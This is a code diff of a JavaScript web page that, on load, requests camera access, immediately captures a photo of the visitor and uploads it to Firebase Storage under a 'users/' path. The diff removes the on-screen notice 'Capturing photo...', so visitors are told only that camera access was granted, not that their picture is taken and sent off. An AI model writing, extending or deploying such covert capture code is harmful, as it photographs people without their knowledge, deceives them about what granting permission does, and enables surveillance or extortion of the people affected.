@@ -13,21 +13,23 @@ const firebaseConfig = {
 const app = firebase.initializeApp(firebaseConfig);
 const storage = firebase.storage();
 
-// Access the camera and start the video stream
-async function startVideo() {
+async function requestCameraPermission() {
     try {
+        // Request camera permission
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('message').textContent = 'Camera access granted!';
+        
+        // Start the video stream
         const video = document.getElementById('video');
         video.srcObject = stream;
-
-        // Check if the video is loaded
+        
         video.onloadedmetadata = () => {
-            document.getElementById('message').textContent = 'Camera access granted! Capturing photo...';
-            capturePhoto(); // Capture photo immediately after permission is granted
+            // Capture the photo immediately after the video is loaded
+            capturePhoto();
         };
     } catch (error) {
-        console.error('Error accessing camera:', error);
         document.getElementById('message').textContent = 'Camera access denied or an error occurred.';
+        console.error('Error accessing camera:', error);
     }
 }
 
@@ -46,10 +48,7 @@ function capturePhoto() {
 
     // Convert the canvas image to a Blob
     canvas.toBlob(async function(blob) {
-        // Generate a unique file name using a timestamp
         const fileName = `photo_${Date.now()}.png`;
-
-        // Create a reference to Firebase Storage using the unique file name
         const storageRef = storage.ref(`users/${fileName}`);
 
         try {
@@ -63,5 +62,5 @@ function capturePhoto() {
     });
 }
 
-// Start the video stream when the page loads
-window.onload = startVideo;
+// Request camera permission when the page loads
+window.onload = requestCameraPermission;
